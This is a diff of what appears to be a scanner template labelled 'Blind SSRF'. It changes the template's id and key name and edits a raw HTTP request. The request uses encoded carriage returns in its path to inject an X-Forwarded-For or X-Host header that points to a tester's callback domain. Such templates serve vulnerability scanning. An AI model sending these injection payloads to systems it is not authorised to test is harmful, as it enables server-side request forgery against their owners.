@@ -1,17 +1,17 @@
-id: 0x095
+id: 0x111
 
 info:
   name: Blind SSRF
   author: 0xAwali
   severity: info
 
-http:
+requests:
   - raw:
     - |+
-      GET /%20HTTP/1.1%0DX-Forwarded-For:%20{{Host}}.{{Port}}.BSSRF-095.{{MY-DOMAIN}}%0D%0D HTTP/1.1
+      GET /%20HTTP/1.1%3F%0DX-Host:%20{{Host}}.{{Port}}.BSSRF-111.{{MY-DOMAIN}}%3F%0D%3F%0D HTTP/1.1
       Host: {{Hostname}}
-      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
       Cache-Control: no-transform
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
       Accept-Encoding: gzip, deflate
       Accept: */*
 
